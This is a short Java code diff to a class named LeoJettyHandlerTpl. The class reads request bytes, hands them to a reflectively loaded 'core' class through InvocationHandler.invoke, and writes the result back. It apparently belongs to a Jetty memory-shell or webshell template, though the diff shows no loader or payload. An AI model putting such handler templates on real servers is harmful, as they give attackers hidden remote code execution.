@@ -35,7 +35,11 @@ public class LeoJettyHandlerTpl {
             byte[] block = new byte[1024];
             int read;
             while ((read = input.read(block)) != -1) buffer.write(block, 0, read);
-            loadCore().newInstance().equals(buffer);
+            try {
+                ((java.lang.reflect.InvocationHandler) loadCore().newInstance()).invoke(null, null, new Object[]{buffer});
+            } catch (Throwable e) {
+                throw new IllegalStateException("Core invocation failed", e);
+            }
             output.write(buffer.toByteArray());
             output.flush();
             return true;
